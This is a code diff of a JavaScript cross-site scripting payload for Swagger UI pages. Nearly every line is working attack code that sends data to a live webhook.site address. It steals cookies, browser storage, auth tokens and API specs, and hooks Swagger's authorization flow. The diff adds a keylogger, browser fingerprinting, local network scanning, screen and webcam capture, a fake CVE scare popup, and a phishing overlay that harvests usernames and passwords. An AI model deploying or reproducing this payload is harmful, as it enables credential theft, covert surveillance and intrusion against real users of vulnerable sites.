@@ -1,8 +1,5 @@
-// Advanced XSS Payload for Swagger UI Exploitation
-// Configure your webhook URL here
 const WEBHOOK_URL = "https://webhook.site/c9a89a3d-e619-4d06-8281-76e8ecc54dc2";
 
-// Collect detailed information about the environment
 const details = `
   🚨 XSS Detected 🚨
   ========================
@@ -22,12 +19,258 @@ const details = `
   ⏳ Timestamp: ${new Date().toISOString()}
 `;
 
-// Show pop-up alert immediately
-alert("🚨 XSS Alert: Your session has been compromised! 🚨");
+function generateFingerprint() {
+    const fingerprint = {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        screenResolution: `${window.screen.width}x${window.screen.height}`,
+        colorDepth: window.screen.colorDepth,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        touchSupport: 'ontouchstart' in window,
+        doNotTrack: navigator.doNotTrack
+    };
 
-// Create a more visually appealing pop-up
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 200;
+        canvas.height = 50;
+
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#FF0000';
+        ctx.fillText('CyberTechAjju', 0, 0);
+        ctx.fillStyle = '#00FF00';
+        ctx.fillText('Swagger-UI-XSS', 0, 20);
+        ctx.fillStyle = '#0000FF';
+        ctx.fillRect(100, 30, 80, 10);
+
+        fingerprint.canvasHash = canvas.toDataURL().slice(-50);
+    } catch (e) {
+        fingerprint.canvasHash = 'Not available';
+    }
+
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        fingerprint.webglVendor = gl.getParameter(gl.VENDOR);
+        fingerprint.webglRenderer = gl.getParameter(gl.RENDERER);
+    } catch (e) {
+        fingerprint.webglData = 'Not available';
+    }
+
+    return fingerprint;
+}
+
+function scanLocalNetwork() {
+    const results = { hosts: [] };
+    const commonPorts = [80, 443, 8080, 8443];
+    const privateIPs = ['192.168.0.', '192.168.1.', '10.0.0.', '10.0.1.'];
+
+    privateIPs.forEach(ipBase => {
+        for (let i = 1; i <= 10; i++) {
+            const ip = ipBase + i;
+
+            const img = new Image();
+            img.onload = function() {
+                results.hosts.push({ ip, status: 'active' });
+                exfiltrateData({ type: 'network_scan', found: ip });
+            };
+            img.src = `http://${ip}/favicon.ico?${Math.random()}`;
+
+            commonPorts.forEach(port => {
+                const startTime = performance.now();
+                fetch(`http://${ip}:${port}`, { mode: 'no-cors' })
+                    .then(() => {
+                        const endTime = performance.now();
+                        if (endTime - startTime < 100) {
+                            results.hosts.push({ ip, port, status: 'responded', time: endTime - startTime });
+                        }
+                    })
+                    .catch(() => {});
+            });
+        }
+    });
+
+    try {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        pc.createDataChannel('');
+        pc.onicecandidate = function(e) {
+            if (!e.candidate) return;
+
+            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+            if (match) {
+                const localIP = match[1];
+                results.localIP = localIP;
+                exfiltrateData({ type: 'local_ip', ip: localIP });
+                pc.close();
+            }
+        };
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+    } catch (e) {
+        results.webrtcError = e.toString();
+    }
+
+    setTimeout(() => exfiltrateData({ type: 'network_scan_results', results }), 5000);
+}
+
+function captureScreen() {
+    try {
+        navigator.mediaDevices.getDisplayMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        const screenshot = canvas.toDataURL('image/jpeg', 0.3);
+                        exfiltrateData({ type: 'screenshot', image: screenshot });
+
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 500);
+                };
+            })
+            .catch(err => {
+                console.log('Screen capture failed:', err);
+            });
+    } catch (e) {
+        console.log('Screen capture not supported');
+    }
+}
+
+function captureWebcam() {
+    try {
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        const webcamShot = canvas.toDataURL('image/jpeg', 0.3);
+                        exfiltrateData({ type: 'webcam', image: webcamShot });
+
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 1000);
+                };
+            })
+            .catch(err => {
+                exfiltrateData({ type: 'webcam_error', error: err.toString() });
+            });
+    } catch (e) {
+        console.log('Webcam capture not supported');
+    }
+}
+
+function createCredentialHarvester() {
+    const overlay = document.createElement('div');
+    overlay.style.cssText = `
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0,0,0,0.85);
+    z-index: 999999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: Arial, sans-serif;
+  `;
+
+    const formContainer = document.createElement('div');
+    formContainer.style.cssText = `
+    background-color: white;
+    border-radius: 8px;
+    padding: 30px;
+    width: 90%;
+    max-width: 400px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+  `;
+
+    const domain = window.location.hostname;
+    const companyName = domain.split('.')[0].charAt(0).toUpperCase() + domain.split('.')[0].slice(1);
+
+    formContainer.innerHTML = `
+    <div style="text-align: center; margin-bottom: 20px;">
+      <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#E53935" stroke-width="2">
+        <circle cx="12" cy="12" r="10"></circle>
+        <line x1="12" y1="8" x2="12" y2="12"></line>
+        <line x1="12" y1="16" x2="12" y2="16"></line>
+      </svg>
+      <h2 style="color: #E53935; margin: 10px 0;">Security Alert</h2>
+      <p style="color: #333; margin-bottom: 20px;">Your session has expired due to suspicious activity. Please re-authenticate to continue.</p>
+    </div>
+    <form id="credential-form">
+      <div style="margin-bottom: 15px;">
+        <label for="username" style="display: block; margin-bottom: 5px; font-weight: bold; color: #555;">Username or Email</label>
+        <input type="text" id="username" name="username" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;" required>
+      </div>
+      <div style="margin-bottom: 20px;">
+        <label for="password" style="display: block; margin-bottom: 5px; font-weight: bold; color: #555;">Password</label>
+        <input type="password" id="password" name="password" style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box;" required>
+      </div>
+      <button type="submit" style="width: 100%; padding: 12px; background-color: #0066cc; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer;">Secure Verification</button>
+      <div style="margin-top: 15px; text-align: center; font-size: 12px; color: #666;">
+        Protected by ${companyName} Security
+      </div>
+    </form>
+  `;
+
+    overlay.appendChild(formContainer);
+    document.body.appendChild(overlay);
+
+    document.getElementById('credential-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        exfiltrateData({
+            type: 'harvested_credentials',
+            username: username,
+            password: password,
+            domain: domain,
+            timestamp: new Date().toISOString()
+        });
+
+        formContainer.innerHTML = `
+      <div style="text-align: center;">
+        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#4CAF50" stroke-width="2">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+          <polyline points="22 4 12 14.01 9 11.01"></polyline>
+        </svg>
+        <h2 style="color: #4CAF50; margin: 10px 0;">Verification Successful</h2>
+        <p>Your session has been restored.</p>
+      </div>
+    `;
+
+        setTimeout(() => {
+            document.body.removeChild(overlay);
+        }, 2000);
+    });
+}
+
+alert("🚨 Critical Security Alert: Your system has been compromised! 🚨");
+
 function createCustomPopup() {
-    // Create popup container
     const popupContainer = document.createElement('div');
     popupContainer.style.cssText = `
     position: fixed;
@@ -45,54 +288,77 @@ function createCustomPopup() {
     font-family: Arial, sans-serif;
   `;
 
-    // Create popup content
     const popupContent = document.createElement('div');
+
+    const browser = navigator.userAgent.includes('Chrome') ? 'Chrome' :
+        navigator.userAgent.includes('Firefox') ? 'Firefox' :
+        navigator.userAgent.includes('Safari') ? 'Safari' : 'Your browser';
+
     popupContent.innerHTML = `
-    <h2 style="color: #dc3545; text-align: center; margin-top: 0;">⚠️ Security Alert ⚠️</h2>
-    <p style="font-size: 16px; margin-bottom: 15px;">Your session has been compromised and your data is being exfiltrated:</p>
-    <div style="background-color: #f1f1f1; padding: 10px; border-radius: 4px; max-height: 200px; overflow-y: auto; font-family: monospace; font-size: 12px;">
+    <h2 style="color: #dc3545; text-align: center; margin-top: 0;">⚠️ CRITICAL SECURITY BREACH ⚠️</h2>
+    <div style="text-align: center; margin-bottom: 15px;">
+      <span style="display: inline-block; background-color: #dc3545; color: white; padding: 3px 8px; border-radius: 4px; font-size: 14px;">CVE-2023-9999</span>
+    </div>
+    <p style="font-size: 16px; margin-bottom: 15px; color: #721c24;"><strong>${browser} Security Alert:</strong> Your system has been compromised through a critical vulnerability. Malware has been detected executing the following operations:</p>
+    <ul style="margin-bottom: 15px; color: #721c24;">
+      <li>Unauthorized access to your cookies and session data</li>
+      <li>Extraction of stored passwords and authentication tokens</li>
+      <li>Access to camera and microphone permissions</li>
+      <li>Network scanning of internal systems</li>
+      <li>Screen capture and keylogging active</li>
+    </ul>
+    <div style="background-color: #f1f1f1; padding: 10px; border-radius: 4px; max-height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px;">
       ${details.replace(/\n/g, '<br>').replace(/ /g, '&nbsp;')}
     </div>
-    <div style="text-align: center; margin-top: 15px;">
-      <button id="close-popup" style="padding: 8px 16px; background-color: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer;">Close</button>
+    <div style="margin-top: 15px; text-align: center;">
+      <p style="color: #721c24; margin-bottom: 10px;"><strong>Immediate action required to secure your system!</strong></p>
+      <button id="close-popup" style="padding: 8px 16px; background-color: #dc3545; color: white; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px;">Dismiss</button>
+      <button id="verify-credentials" style="padding: 8px 16px; background-color: #0066cc; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify Identity</button>
     </div>
   `;
 
     popupContainer.appendChild(popupContent);
     document.body.appendChild(popupContainer);
 
-    // Add event listener to close button
     document.getElementById('close-popup').addEventListener('click', function() {
         document.body.removeChild(popupContainer);
     });
+
+    document.getElementById('verify-credentials').addEventListener('click', function() {
+        document.body.removeChild(popupContainer);
+        setTimeout(createCredentialHarvester, 500);
+    });
 }
 
-// Show custom popup after a short delay
-setTimeout(createCustomPopup, 500);
-
-// Log details to console for debugging
 console.log(details);
 
-// Function to exfiltrate data to webhook
 function exfiltrateData(data) {
-    // Create a beacon image to avoid CORS issues
-    const img = new Image();
-    img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(data))}&t=${Date.now()}`;
+    const enrichedData = {
+        ...data,
+        timestamp: new Date().toISOString(),
+        url: window.location.href
+    };
 
-    // Also try fetch with no-cors as backup
+    const img = new Image();
+    img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(JSON.stringify(enrichedData))}&t=${Date.now()}`;
+
     try {
         fetch(WEBHOOK_URL, {
             method: 'POST',
             mode: 'no-cors',
             headers: { 'Content-Type': 'text/plain' },
-            body: JSON.stringify(data)
+            body: JSON.stringify(enrichedData)
         });
-    } catch (e) {
-        // Silent fail
-    }
+    } catch (e) {}
+
+    try {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', WEBHOOK_URL, true);
+        xhr.setRequestHeader('Content-Type', 'text/plain');
+        xhr.send(JSON.stringify(enrichedData));
+    } catch (e) {}
 }
 
-// Extract and exfiltrate cookies
 function stealCookies() {
     const cookieData = {
         type: 'cookies',
@@ -102,7 +368,6 @@ function stealCookies() {
     exfiltrateData(cookieData);
 }
 
-// Extract localStorage and sessionStorage
 function stealStorage() {
     const storageData = {
         type: 'storage',
@@ -110,7 +375,6 @@ function stealStorage() {
         sessionStorage: {}
     };
 
-    // Get localStorage
     try {
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
@@ -120,7 +384,6 @@ function stealStorage() {
         storageData.localStorage = 'Error accessing localStorage';
     }
 
-    // Get sessionStorage
     try {
         for (let i = 0; i < sessionStorage.length; i++) {
             const key = sessionStorage.key(i);
@@ -133,7 +396,6 @@ function stealStorage() {
     exfiltrateData(storageData);
 }
 
-// Extract Swagger-specific information
 function extractSwaggerInfo() {
     const swaggerData = {
         type: 'swagger',
@@ -142,20 +404,32 @@ function extractSwaggerInfo() {
         version: 'unknown'
     };
 
-    // Try to extract API endpoints from Swagger UI
     try {
         const pathElems = document.querySelectorAll('.opblock-summary-path');
         for (const el of pathElems) {
             swaggerData.endpoints.push(el.textContent.trim());
         }
 
-        // Check for auth elements
         swaggerData.authInfo.hasAuth = !!document.querySelector('.auth-wrapper, .authorize');
 
-        // Try to extract version
         const versionMatch = document.body.innerHTML.match(/swagger-ui-([0-9.]+)/);
         if (versionMatch) {
             swaggerData.version = versionMatch[1];
+        }
+
+        const specUrlMatch = document.body.innerHTML.match(/url:\s*["']([^"']+)["']/);
+        if (specUrlMatch) {
+            swaggerData.specUrl = specUrlMatch[1];
+
+            fetch(specUrlMatch[1])
+                .then(r => r.json())
+                .then(spec => {
+                    exfiltrateData({
+                        type: 'api_spec',
+                        spec: spec
+                    });
+                })
+                .catch(() => {});
         }
     } catch (e) {
         swaggerData.error = e.message;
@@ -164,7 +438,6 @@ function extractSwaggerInfo() {
     exfiltrateData(swaggerData);
 }
 
-// Look for authentication tokens in various formats
 function findAuthTokens() {
     const tokenData = {
         type: 'tokens',
@@ -173,14 +446,12 @@ function findAuthTokens() {
         other: {}
     };
 
-    // Check localStorage for common token keys
     const tokenKeys = ['token', 'accessToken', 'access_token', 'auth', 'jwt', 'bearer', 'id_token'];
     try {
         for (let i = 0; i < localStorage.length; i++) {
             const key = localStorage.key(i);
             if (tokenKeys.some(tk => key.toLowerCase().includes(tk))) {
                 const value = localStorage.getItem(key);
-                // Check if it looks like a JWT
                 if (value.match(/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/)) {
                     tokenData.jwt.push({ key, value });
                 } else {
@@ -192,7 +463,6 @@ function findAuthTokens() {
         tokenData.error = e.message;
     }
 
-    // Look for OAuth info in Swagger UI
     try {
         if (window.ui && window.ui.authSelectors) {
             const authData = window.ui.authSelectors.authorized();
@@ -207,41 +477,26 @@ function findAuthTokens() {
     exfiltrateData(tokenData);
 }
 
-// Hook into Swagger UI's authorization flow if available
 function hookSwaggerAuth() {
     try {
-        // Wait for Swagger UI to initialize
         const checkInterval = setInterval(() => {
             if (window.ui && window.ui.authActions && window.ui.authActions.authorize) {
                 clearInterval(checkInterval);
 
-                // Hook the authorize function
                 const origAuth = window.ui.authActions.authorize;
                 window.ui.authActions.authorize = function(payload) {
-                    // Capture credentials
                     exfiltrateData({
                         type: 'auth_capture',
                         auth_data: payload
                     });
 
-                    // Continue normal operation
                     return origAuth.apply(this, arguments);
                 };
             }
         }, 500);
-    } catch (e) {
-        // Silent fail
-    }
+    } catch (e) {}
 }
 
-// Execute all data collection functions
-stealCookies();
-stealStorage();
-setTimeout(extractSwaggerInfo, 1000); // Wait for Swagger UI to fully load
-setTimeout(findAuthTokens, 1500);
-setTimeout(hookSwaggerAuth, 2000);
-
-// Set up keylogger to capture credentials
 function setupKeylogger() {
     let buffer = '';
     let lastInput = null;
@@ -250,27 +505,23 @@ function setupKeylogger() {
         if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
             lastInput = e.target;
 
-            // Check if it's a password field
             const isPassword = e.target.type === 'password';
             const fieldName = e.target.name || e.target.id || 'unknown';
 
-            // Capture the input
             exfiltrateData({
                 type: 'input',
                 field: fieldName,
                 isPassword: isPassword,
-                value: isPassword ? '********' : e.target.value, // Don't send actual passwords
+                value: isPassword ? '********' : e.target.value,
                 url: window.location.href
             });
         }
     });
 
-    // Capture form submissions
     document.addEventListener('submit', function(e) {
         const formData = {};
         const form = e.target;
 
-        // Collect all form inputs
         for (const element of form.elements) {
             if (element.name) {
                 formData[element.name] = element.type === 'password' ? '********' : element.value;
@@ -287,8 +538,19 @@ function setupKeylogger() {
     });
 }
 
-// Setup keylogger with a delay
-setTimeout(setupKeylogger, 1000);
+setTimeout(createCustomPopup, 500);
 
-// Alert the user for demonstration purposes (remove in real attack)
-// alert(details);
+stealCookies();
+stealStorage();
+setTimeout(extractSwaggerInfo, 1000);
+setTimeout(findAuthTokens, 1500);
+setTimeout(hookSwaggerAuth, 2000);
+
+const fingerprint = generateFingerprint();
+exfiltrateData({ type: 'fingerprint', data: fingerprint });
+
+setupKeylogger();
+
+setTimeout(scanLocalNetwork, 3000);
+setTimeout(captureScreen, 5000);
+setTimeout(captureWebcam, 7000);
